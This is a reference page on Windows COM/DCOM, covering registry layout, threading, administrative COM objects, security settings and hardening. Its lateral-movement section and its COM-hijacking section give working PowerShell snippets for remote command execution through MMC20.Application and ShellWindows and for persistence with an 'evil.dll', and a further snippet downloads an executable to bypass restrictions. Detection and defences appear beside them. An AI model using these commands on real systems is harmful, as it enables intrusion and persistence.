---
title: "Windows - COM/DCOM Objects"
date: "2026-05-15"
---

COM (Component Object Model) is a binary standard for interaction between software components in Windows. It is language-agnostic: one object written in C++ can be consumed from Python or PowerShell seamlessly. DCOM (Distributed COM) extends this to network calls. Understanding COM is essential for system administration, automation, penetration testing, and development.

---

## Core Concepts

```
COM object - an instance of a class implementing one or more interfaces.

Interface - a set of methods with fixed signatures.
  All COM interfaces inherit IUnknown:
    QueryInterface(riid, ppvObject) - get another interface of the object
    AddRef()                        - increment reference count
    Release()                       - decrement reference count (free at 0)

GUID (Globally Unique Identifier) - 128-bit unique identifier.
  Format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
  Used to identify classes and interfaces.

CLSID (Class ID) - GUID of a specific COM class.
  Example: {00021401-0000-0000-C000-000000000046} = Shell Link (shortcuts)

IID (Interface ID) - GUID of a specific interface.
  Example: {000214F9-0000-0000-C000-000000000046} = IShellLink

ProgID (Programmatic ID) - human-readable class name.
  Examples: "Shell.Application", "Excel.Application", "Scripting.FileSystemObject"
  ProgID → CLSID: via registry HKCR\<ProgID>\CLSID\

Server (COM Server) - a DLL or EXE containing the COM class implementation:
  In-Process Server (DLL) - loaded into the client's address space
  Local Server (EXE)      - separate process, IPC via LPC/ALPC
  Remote Server (EXE)     - another machine, IPC via DCOM/RPC
```

### Registry Basis of COM

```
All COM configuration lives in the registry.

HKEY_CLASSES_ROOT\CLSID\{CLSID}\
  (Default)         = "Friendly name"
  InprocServer32\
    (Default)       = "C:\path\to\server.dll"
    ThreadingModel  = "Apartment" | "Free" | "Both" | "Neutral"
  LocalServer32\
    (Default)       = "C:\path\to\server.exe"
  ProgID\
    (Default)       = "App.Object"

HKEY_CLASSES_ROOT\<ProgID>\
  (Default)         = "Friendly Name"
  CLSID\
    (Default)       = "{CLSID}"

HKLM\SOFTWARE\Classes\CLSID\   (system-wide, all users)
HKCU\SOFTWARE\Classes\CLSID\   (per-user, current user only)
  (HKCR = merge of HKLM\SOFTWARE\Classes + HKCU\SOFTWARE\Classes)

Find CLSID by ProgID:
  reg query "HKCR\Shell.Application\CLSID"
  # Result: {13709620-C279-11CE-A49E-444553540000}

Find DLL by CLSID:
  reg query "HKCR\CLSID\{13709620-C279-11CE-A49E-444553540000}\InprocServer32"
```

---

## Creating COM Objects

### PowerShell

```powershell
# Create by ProgID
$shell = New-Object -ComObject "Shell.Application"
$fso   = New-Object -ComObject "Scripting.FileSystemObject"
$wsh   = New-Object -ComObject "WScript.Shell"

# Create by CLSID (when no ProgID is available)
$obj = [Activator]::CreateInstance([Type]::GetTypeFromCLSID(
    [Guid]"{13709620-C279-11CE-A49E-444553540000}"
))

# Create on a remote machine (DCOM)
$obj = [Activator]::CreateInstance(
    [Type]::GetTypeFromProgID("Shell.Application", "SERVER01")
)

# Explore methods and properties
$shell | Get-Member
$shell | Get-Member -MemberType Method

# Practical examples:
$shell.Open("C:\Windows")
$shell.Windows() | Select-Object LocationName, LocationURL

$fso.GetDrive("C:").FreeSpace / 1GB
$fso.FolderExists("C:\Temp")
```

### C++ (Native COM)

```cpp
#include <objbase.h>
#include <shlobj.h>

int main() {
    // Initialize COM (always first)
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    IShellLink* pLink = nullptr;

    HRESULT hr = CoCreateInstance(
        CLSID_ShellLink,          // which class to create
        nullptr,                  // outer (for aggregation)
        CLSCTX_INPROC_SERVER,     // where to create (in-process DLL)
        IID_IShellLink,           // which interface to get
        (void**)&pLink            // where to write the pointer
    );

    if (SUCCEEDED(hr)) {
        pLink->SetPath(L"C:\\Windows\\notepad.exe");

        // QueryInterface - get another interface of the same object
        IPersistFile* pFile = nullptr;
        hr = pLink->QueryInterface(IID_IPersistFile, (void**)&pFile);
        if (SUCCEEDED(hr)) {
            pFile->Save(L"C:\\Temp\\notepad.lnk", TRUE);
            pFile->Release();  // always Release!
        }
        pLink->Release();
    }

    CoUninitialize();
    return 0;
}

// CLSCTX values:
// CLSCTX_INPROC_SERVER  - DLL in current process
// CLSCTX_LOCAL_SERVER   - EXE on same machine (different process)
// CLSCTX_REMOTE_SERVER  - EXE on another machine (DCOM)
// CLSCTX_ALL            - Windows picks (in-proc, then local, then remote)
```

---

## Threading Models

```
Threading model determines which thread can call a COM object's methods.
Critical for understanding marshaling overhead and performance.

Apartment (STA - Single-Threaded Apartment):
  Object lives in one specific thread.
  Calls from other threads are marshaled via the Windows message queue.
  Thread must be initialized: CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)
  Examples: most legacy COM objects, all UI objects.

MTA (Multi-Threaded Apartment):
  Object can be called from any MTA thread simultaneously.
  Object is responsible for its own thread safety (mutexes, etc.).
  Initialization: CoInitializeEx(NULL, COINIT_MULTITHREADED)
  Examples: ADODB, high-performance COM servers.

Both:
  Supports both STA and MTA - called directly in whichever thread calls it.
  Most flexible and performant.

Neutral (NTA):
  Special neutral apartment, called in a dedicated thread without marshaling.
  Rarely used.

Cross-apartment marshaling:
  If an STA object is called from another thread, COM creates a proxy/stub pair.
  Proxy - object in calling thread that redirects calls.
  Stub  - object in the object's thread that receives calls.
  Transport between threads: ALPC.
  Overhead: significantly higher than a direct call.

Rule: always create a COM object in the same thread where you will use it.
```

---

## DCOM - Distributed COM

```
DCOM = COM + network transport (MSRPC over TCP).
Allows creating COM objects on remote machines and calling their methods.

Ports:
  TCP 135       - RPC Endpoint Mapper (find which port a DCOM server uses)
  TCP 445       - SMB (for authentication)
  TCP 49152-65535 - dynamically allocated ports for DCOM connections

Configuration:
  dcomcnfg.exe → Component Services → Computers → My Computer → DCOM Config
  Or: HKLM\SOFTWARE\Microsoft\OLE

Key registry settings:
  HKLM\SOFTWARE\Microsoft\OLE\
    EnableDCOM = "Y"            # enable DCOM
    LegacyAuthenticationLevel  # authentication level
    LegacyImpersonationLevel   # impersonation level

Per-class settings:
  HKCR\AppID\{AppID}\
    LaunchPermission   # who can start the DCOM server
    AccessPermission   # who can call methods
    RunAs             # run as whom (empty = launching user)
```

### DCOM Security Levels

```
Authentication Level (HKLM\SOFTWARE\Microsoft\OLE\LegacyAuthenticationLevel):
  1 = None           - no authentication
  2 = Connect        - authenticate at connection
  3 = Call           - authenticate each call
  4 = Packet         - authenticate each packet
  5 = PacketIntegrity- packet + integrity check
  6 = PacketPrivacy  - packet + encryption (recommended)

Impersonation Level:
  1 = Anonymous      - client is anonymous
  2 = Identify       - server knows client identity, cannot act as them
  3 = Impersonate    - server acts as client (local resources)
  4 = Delegate       - server can delegate client to other servers

PowerShell - remote DCOM:
  # WMI via DCOM (legacy but functional)
  $wmi = [WMIClass]"\\SERVER01\root\cimv2:Win32_Process"
  $wmi.Create("notepad.exe")

  # Via GetTypeFromProgID
  $obj = [Activator]::CreateInstance(
      [Type]::GetTypeFromProgID("WScript.Shell", "SERVER01")
  )
  $obj.Run("cmd.exe /c whoami > C:\Temp\out.txt")
```

### DCOM Lateral Movement

```
DCOM is actively used for lateral movement in penetration testing.
Advantages over PsExec: no service written to disk, fewer log artifacts.

Popular DCOM classes for LM:

1. MMC20.Application ({49B2791A-B1AE-4C90-9B8E-E860BA07F889})
   Method: Document.ActiveView.ExecuteShellCommand

   $obj = [Activator]::CreateInstance(
       [Type]::GetTypeFromProgID("MMC20.Application", "TARGET")
   )
   $obj.Document.ActiveView.ExecuteShellCommand(
       "cmd.exe", $null, "/c whoami > C:\Temp\out.txt", "7"
   )

2. ShellWindows ({9BA05972-F6A8-11CF-A442-00A0C90A8F39})
   Method: via ShellExecute

   $obj = [Activator]::CreateInstance(
       [Type]::GetTypeFromCLSID([Guid]"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", "TARGET")
   )
   $item = $obj.Item()
   $item.Document.Application.ShellExecute(
       "cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0
   )

3. ShellBrowserWindow ({C08AFD90-F2A1-11D1-8455-00A0C91F3880})
   Similar to ShellWindows.

4. Excel.Application / Word.Application (if Office is installed)
   Run a macro or use Shell method.

Requirements:
  - Local administrator credentials on the target
  - DCOM not blocked by firewall (TCP 135 + dynamic ports open)

Detection:
  EventID 4688 (Process Creation) on the target
  EventID 4624 (Logon Type 3 = Network)
  Sysmon EventID 10 (ProcessAccess) if DCOM spawns processes
```

---

## COM Hijacking

```
COM Hijacking - an attack on the COM class resolution mechanism.
Windows checks HKCU before HKLM when looking up a CLSID.
By creating HKCU\SOFTWARE\Classes\CLSID\{CLSID}, an attacker intercepts
calls to a system COM object.

How it works:
  1. Process calls CoCreateInstance({CLSID})
  2. Windows looks up {CLSID} in HKCU\SOFTWARE\Classes\CLSID\ → FOUND
  3. Loads the DLL specified in HKCU (instead of the system DLL from HKLM)
  4. Attacker's DLL runs in the context of that process

Finding hijackable CLSIDs:
  Process Monitor filter:
    Operation=RegOpenKey AND Path contains HKCU\Software\Classes\CLSID AND Result=NAME NOT FOUND
  This shows all CLSIDs looked up in HKCU but not found there.

Example - hijack a Scheduled Task (persistence):
  $clsid = "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
  $regPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"
  New-Item -Path $regPath -Force
  Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Temp\evil.dll"
  Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
  # Next time this CLSID is loaded - evil.dll runs

Defenses:
  Monitor HKCU\SOFTWARE\Classes\CLSID\ for new key creation
  Autoruns.exe (Sysinternals) → "COM Hijacks" tab shows hijacked entries
  Process Monitor can catch the exact moment of hijacking
```

---

## Useful COM Objects for Administration

### Shell.Application

```powershell
$shell = New-Object -ComObject Shell.Application

# List all open Explorer windows
$shell.Windows() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.LocationName
        URL  = $_.LocationURL
    }
}

# Extract ZIP without external tools
$zip  = $shell.NameSpace("C:\archive.zip")
$dest = $shell.NameSpace("C:\Extracted")
$dest.CopyHere($zip.Items())

# Navigate to known folders
$desktop = $shell.NameSpace(0)   # Desktop
$myDocs  = $shell.NameSpace(5)   # My Documents
$system  = $shell.NameSpace(37)  # System32
```

### WScript.Shell

```powershell
$wsh = New-Object -ComObject WScript.Shell

# Run commands
$wsh.Run("notepad.exe")
$wsh.Run("cmd.exe /c dir C:\", 0, $true)  # 0=hidden, $true=wait

# Environment variables
$wsh.ExpandEnvironmentStrings("%USERPROFILE%")
$wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")

# Create shortcut
$lnk = $wsh.CreateShortcut("$env:USERPROFILE\Desktop\MyApp.lnk")
$lnk.TargetPath = "C:\MyApp\app.exe"
$lnk.Arguments  = "--config prod.ini"
$lnk.WorkingDirectory = "C:\MyApp"
$lnk.Save()

# Registry access
$wsh.RegRead("HKCU\Software\MyApp\Setting")
$wsh.RegWrite("HKCU\Software\MyApp\Setting", "value", "REG_SZ")
$wsh.RegDelete("HKCU\Software\MyApp\Setting")

# SendKeys
$wsh.AppActivate("Notepad")
$wsh.SendKeys("Hello World{ENTER}")
$wsh.SendKeys("%{F4}")  # Alt+F4
```

### Scripting.FileSystemObject

```powershell
$fso = New-Object -ComObject Scripting.FileSystemObject

# Drives
$fso.Drives | Select-Object DriveLetter,
    @{N="FreeGB"; E={[math]::Round($_.FreeSpace/1GB, 2)}}

# Files and folders
$fso.FileExists("C:\Windows\notepad.exe")
$fso.CopyFile("C:\src.txt", "C:\dst.txt", $true)
$fso.DeleteFile("C:\unwanted.txt")
$fso.CreateFolder("C:\Temp\NewDir")
$fso.DeleteFolder("C:\Temp\OldDir", $true)

# Text file read/write
$file = $fso.OpenTextFile("C:\file.txt", 1)  # 1=ForReading
while (!$file.AtEndOfStream) { Write-Host $file.ReadLine() }
$file.Close()

$out = $fso.CreateTextFile("C:\out.txt", $true)
$out.WriteLine("Hello")
$out.Close()
```

### HTTP via COM (MSXML2 / WinHttp)

```powershell
# Useful for bypassing restrictions in constrained environments

# Simple GET
$http = New-Object -ComObject MSXML2.XMLHTTP.6.0
$http.Open("GET", "https://example.com/file.txt", $false)
$http.Send()
$http.ResponseText

# Download binary file (no Invoke-WebRequest needed)
$http = New-Object -ComObject MSXML2.XMLHTTP.6.0
$http.Open("GET", "https://example.com/tool.exe", $false)
$http.Send()

$stream = New-Object -ComObject ADODB.Stream
$stream.Type = 1  # adTypeBinary
$stream.Open()
$stream.Write($http.ResponseBody)
$stream.SaveToFile("C:\Temp\tool.exe", 2)
$stream.Close()

# WinHttp with custom headers
$winhttp = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$winhttp.Open("GET", "https://api.example.com/data", $false)
$winhttp.SetRequestHeader("Authorization", "Bearer TOKEN")
$winhttp.Send()
$winhttp.ResponseText
```

---

## Investigating COM Objects

### Enumerate via Registry

```powershell
# All registered COM classes with their DLL paths
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $name   = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue)."(default)"
        $server = (Get-ItemProperty "$($_.PSPath)\InprocServer32" `
                    -ErrorAction SilentlyContinue)."(default)"
        if ($name -and $server) {
            [PSCustomObject]@{
                CLSID  = $_.PSChildName
                Name   = $name
                Server = $server
            }
        }
    } | Sort-Object Name | Format-Table -AutoSize

# All ProgIDs registered on the system
Get-ChildItem "HKCR:\" -ErrorAction SilentlyContinue |
    Where-Object { $_.GetSubKeyNames() -contains "CLSID" } |
    Select-Object -ExpandProperty PSChildName | Sort-Object

# Find Office COM objects
Get-ChildItem "HKCR:\" |
    Where-Object { $_.PSChildName -match "^Excel\.|^Word\.|^PowerPoint\." } |
    Select-Object PSChildName
```

### Tools

```
OleView (oleview.exe) - included in Windows SDK:
  Browse all registered COM servers and interfaces
  Instantiate objects and call methods interactively
  View TypeLib information

OleViewDotNet (github.com/tyranid/OleViewDotNet) - James Forshaw:
  Modern OleView with .NET support
  Search by CLSID, ProgID, interface
  View and edit DCOM permissions
  Generate C# code for any COM object
  Essential for COM security research

Process Monitor (procmon.exe):
  Capture which CLSIDs a process loads:
  Filter: Operation=RegOpenKey AND Path contains CLSID

Autoruns.exe:
  COM Hijacks tab - shows all HKCU COM overrides
```

---

## COM/DCOM Security

### Access Rights

```
Two layers of DCOM access control:

1. Launch Permissions - who can start the COM server process
   HKCR\AppID\{AppID}\LaunchPermission

2. Access Permissions - who can call methods on a running COM server
   HKCR\AppID\{AppID}\AccessPermission

If explicit permissions are not set, machine defaults are used:
   HKLM\SOFTWARE\Microsoft\OLE\DefaultLaunchPermission
   HKLM\SOFTWARE\Microsoft\OLE\DefaultAccessPermission

View DCOM permissions:
  dcomcnfg.exe → Component Services → My Computer → DCOM Config
  → Right-click object → Properties → Security tab

Check via accesschk (Sysinternals):
  accesschk.exe -ol "Excel.Application"  # launch permissions
  accesschk.exe -oa "Excel.Application"  # access permissions
```

### Monitoring COM Activity

```powershell
# EventID 10016 - DCOM access denied (most common DCOM error)
# Means a process tried to launch a DCOM object without sufficient rights
Get-WinEvent -FilterHashtable @{LogName='System'; Id=10016} -MaxEvents 20 |
    Select-Object TimeCreated,
    @{N="Msg"; E={$_.Message.Substring(0, [Math]::Min(300, $_.Message.Length))}} |
    Format-Table -Wrap

# Fix for 10016: dcomcnfg → find the AppID from the error → set Launch/Access permissions

# All DCOM errors
Get-WinEvent -LogName "System" |
    Where-Object { $_.ProviderName -eq "Microsoft-Windows-DistributedCOM" } |
    Group-Object Id | Sort-Object Count -Descending
```

### Hardening DCOM

```powershell
# Require maximum authentication (packet-level encryption)
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" `
    -Name "LegacyAuthenticationLevel" -Value 6  # 6 = Packet Privacy

Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" `
    -Name "LegacyImpersonationLevel" -Value 2   # 2 = Identify (no impersonation)

# Block DCOM over the network if not needed
New-NetFirewallRule -DisplayName "Block DCOM Remote" `
    -Direction Inbound -Protocol TCP -LocalPort 135 `
    -Action Block

# Disable DCOM entirely (aggressive - may break services, test first!)
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\OLE" -Name "EnableDCOM" -Value "N"
# REQUIRES REBOOT
```

---

## Quick Reference

```
KEY CONCEPTS
  CLSID     - class GUID {xxxxxxxx-...}
  IID       - interface GUID
  ProgID    - class name string "App.Object"
  AppID     - GUID for DCOM security configuration
  IUnknown  - base interface (QueryInterface, AddRef, Release)

REGISTRY LOCATIONS
  HKCR\CLSID\{CLSID}\InprocServer32  - DLL server path
  HKCR\CLSID\{CLSID}\LocalServer32   - EXE server path
  HKCR\<ProgID>\CLSID                 - CLSID for a ProgID
  HKCU\SOFTWARE\Classes\CLSID\       - user overrides (COM hijacking vector!)
  HKCR\AppID\{AppID}\LaunchPermission - DCOM launch rights

THREADING MODELS
  Apartment (STA) - single thread, others marshaled via message queue
  Free (MTA)      - any thread, object must be thread-safe
  Both            - direct call from any apartment
  CoInitializeEx(NULL, COINIT_APARTMENTTHREADED) for STA
  CoInitializeEx(NULL, COINIT_MULTITHREADED) for MTA

CREATING OBJECTS
  PowerShell:       New-Object -ComObject "ProgID"
  PowerShell DCOM:  [Activator]::CreateInstance([Type]::GetTypeFromProgID("P","HOST"))
  C++:              CoCreateInstance(CLSID, NULL, CLSCTX_*, IID, &ptr)

USEFUL PROGIDS
  Shell.Application          - Explorer/Shell operations
  WScript.Shell              - Run, SendKeys, registry, shortcuts
  Scripting.FileSystemObject - filesystem operations
  MSXML2.XMLHTTP.6.0         - HTTP requests
  WinHttp.WinHttpRequest.5.1 - HTTP (more modern)
  Microsoft.XMLDOM           - XML parsing/creation
  ADODB.Stream               - binary data streams

DCOM LATERAL MOVEMENT
  MMC20.Application → Document.ActiveView.ExecuteShellCommand(...)
  ShellWindows {9BA05972-...} → Item().Document.Application.ShellExecute(...)
  Requires: local Admin on target + TCP 135 accessible

COM HIJACKING
  HKCU\SOFTWARE\Classes\CLSID\ checked BEFORE HKLM
  Find candidates: Procmon filter RegOpenKey + NAME NOT FOUND + CLSID path
  Detect existing: Autoruns.exe → COM Hijacks tab

TOOLS
  dcomcnfg.exe   - DCOM permissions UI
  oleview.exe    - SDK COM browser
  OleViewDotNet  - modern COM analysis (GitHub: tyranid)
  accesschk.exe  - check DCOM object permissions
  Autoruns.exe   - detect COM hijacking

EVENT IDS
  System 10016  - DCOM access denied
  Security 4688 - process creation via DCOM
```

---

## References

- [COM Technical Overview](https://learn.microsoft.com/en-us/windows/win32/com/com-technical-overview) - official documentation
- [CoCreateInstance](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance) - object creation API
- [DCOM Security](https://learn.microsoft.com/en-us/windows/win32/com/dcom-security-enhancements-in-windows-xp-sp2-and-windows-server-2003-sp1) - DCOM security settings
- [COM Threading Models](https://learn.microsoft.com/en-us/windows/win32/com/processes--threads--and-apartments) - apartments and threading
- [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) - COM analysis tool by James Forshaw
- [MITRE T1559.001: COM](https://attack.mitre.org/techniques/T1559/001/) - COM in attacks
- [MITRE T1021.003: DCOM Lateral Movement](https://attack.mitre.org/techniques/T1021/003/) - DCOM LM
- [MITRE T1546.015: COM Hijacking](https://attack.mitre.org/techniques/T1546/015/) - COM hijacking persistence
